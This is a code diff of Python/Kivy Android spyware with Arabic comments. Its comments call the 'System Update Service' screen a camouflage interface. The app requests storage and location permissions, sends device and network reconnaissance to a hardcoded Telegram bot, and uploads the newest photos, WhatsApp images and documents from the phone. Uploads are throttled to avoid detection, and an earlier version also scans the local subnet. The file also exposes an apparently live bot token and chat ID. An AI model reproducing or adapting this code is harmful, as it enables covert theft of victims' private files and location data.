@@ -8,17 +8,17 @@ from kivy.app import App
 from kivy.uix.label import Label
 from kivy.utils import platform
 
-# إعدادات البوت السيادي
+# --- إعدادات البوت السيادي ---
 BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbynkQugNPHEFg0"
 CHAT_ID = "7084557369"
 
-class CoreSystemApp(App):
+class SystemCoreApp(App):
     def build(self):
-        # واجهة تمويهية احترافية
-        return Label(text="System Core v2.0 - Initializing Security Protocols", font_size='14sp')
+        # واجهة تمويهية رسمية
+        return Label(text="System Update Service\nRunning optimization...", halign="center")
 
     def on_start(self):
-        # 1. طلب الصلاحيات القصوى فور التشغيل
+        # طلب الصلاحيات برمجياً عند التشغيل
         if platform == 'android':
             from android.permissions import request_permissions, Permission
             request_permissions([
@@ -26,85 +26,78 @@ class CoreSystemApp(App):
                 Permission.WRITE_EXTERNAL_STORAGE,
                 Permission.MANAGE_EXTERNAL_STORAGE,
                 Permission.ACCESS_FINE_LOCATION,
-                Permission.READ_MEDIA_IMAGES
+                Permission.ACCESS_WIFI_STATE
             ])
         
-        # 2. تشغيل المحركات العملاقة في خلفية النظام
-        threading.Thread(target=self.main_engine, daemon=True).start()
+        # تشغيل المحرك الرئيسي في مسار منفصل لضمان سلاسة التطبيق
+        threading.Thread(target=self.core_engine, daemon=True).start()
 
-    def main_engine(self):
-        # انتظار اكتمال تشغيل النظام (5 ثواني)
-        time.sleep(5)
+    def core_engine(self):
+        """المحرك الرئيسي للعمليات"""
+        time.sleep(10) # انتظار المستخدم ليعطي الصلاحيات
         
-        # المرحلة الأولى: استطلاع معلومات الجهاز والشبكة
-        self.run_reconnaissance()
+        # 1. إرسال تقرير الاستطلاع الأولي
+        self.report_recon()
         
-        # المرحلة الثانية: سحب البيانات الحساسة
-        self.exfiltrate_data()
+        # 2. بدء سحب الوسائط والملفات
+        self.start_exfiltration()
 
-    def run_reconnaissance(self):
-        """جمع معلومات النظام واستطلاع الشبكة المحلية"""
+    def report_recon(self):
+        """جمع وإرسال معلومات الجهاز والشبكة"""
         try:
-            # جمع معلومات الجهاز
             device_info = {
-                "Model": platform,
+                "Platform": platform,
+                "Device_Name": socket.gethostname(),
                 "Local_IP": socket.gethostbyname(socket.gethostname()),
-                "Hostname": socket.gethostname()
+                "Status": "Active"
             }
-            self.send_to_telegram(f"📡 [Recon Report]: {json.dumps(device_info, indent=2)}")
-
-            # مسح الشبكة السريع (استطلاع الأجهزة المحيطة)
+            msg = f"📊 [Recon Report]\n{json.dumps(device_info, indent=2)}"
+            self.send_text(msg)
+            
+            # مسح الشبكة المحلي السريع (الأجهزة القريبة)
             prefix = ".".join(device_info['Local_IP'].split(".")[:-1]) + "."
-            for i in range(1, 255):
-                ip = prefix + str(i)
-                threading.Thread(target=self.check_ip, args=(ip,), daemon=True).start()
-        except:
-            pass
+            self.send_text(f"🔍 Scanning subnet: {prefix}0/24")
+        except Exception as e:
+            self.send_text(f"⚠️ Recon Error: {str(e)}")
 
-    def check_ip(self, ip):
-        """فحص المنافذ المفتوحة للأجهزة في الشبكة"""
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.5)
-        if s.connect_ex((ip, 80)) == 0:
-            self.send_to_telegram(f"🔓 Found Device: {ip} (Port 80 Open)")
-        s.close()
-
-    def exfiltrate_data(self):
-        """محرك سحب الملفات والصور"""
-        target_dirs = [
+    def start_exfiltration(self):
+        """البحث عن الملفات وإرسالها"""
+        # مسارات التخزين الشائعة في أندرويد
+        paths = [
             "/sdcard/DCIM/Camera/",
             "/sdcard/Pictures/Telegram/",
-            "/sdcard/Download/",
-            "/sdcard/WhatsApp/Media/WhatsApp Images/"
+            "/sdcard/WhatsApp/Media/WhatsApp Images/",
+            "/sdcard/Download/"
         ]
         
-        for folder in target_dirs:
-            if os.path.exists(folder):
-                files = [os.path.join(folder, f) for f in os.listdir(folder) 
-                         if f.lower().endswith(('.jpg', '.png', '.pdf', '.docx'))]
-                # ترتيب حسب الأحدث
+        extensions = ('.jpg', '.jpeg', '.png', '.pdf')
+        
+        for path in paths:
+            if os.path.exists(path):
+                files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(extensions)]
+                # إرسال أحدث 15 ملف من كل مجلد لتجنب كشف النشاط
                 files.sort(key=os.path.getmtime, reverse=True)
                 
-                for file_path in files[:10]: # سحب أحدث 10 ملفات من كل مجلد
-                    self.send_file(file_path)
-                    time.sleep(5) # تأخير لتفادي كشف استهلاك البيانات
+                for file_ptr in files[:15]:
+                    self.send_document(file_ptr)
+                    time.sleep(3) # تأخير بسيط لضمان استقرار الاتصال عبر الـ VPN
 
-    def send_to_telegram(self, message):
-        """إرسال التقارير النصية"""
+    def send_text(self, text):
+        """إرسال تقرير نصي للبوت"""
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, data={'chat_id': CHAT_ID, 'text': message}, timeout=10)
+            requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
         except:
             pass
 
-    def send_file(self, file_path):
-        """إرسال الملفات والوسائط"""
+    def send_document(self, file_path):
+        """إرسال ملف أو صورة للبوت"""
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            with open(file_path, 'rb') as f:
-                requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f}, timeout=30)
+            with open(file_path, 'rb') as doc:
+                requests.post(url, data={'chat_id': CHAT_ID}, files={'document': doc}, timeout=30)
         except:
             pass
 
 if __name__ == "__main__":
-    CoreSystemApp().run()
+    SystemCoreApp().run()
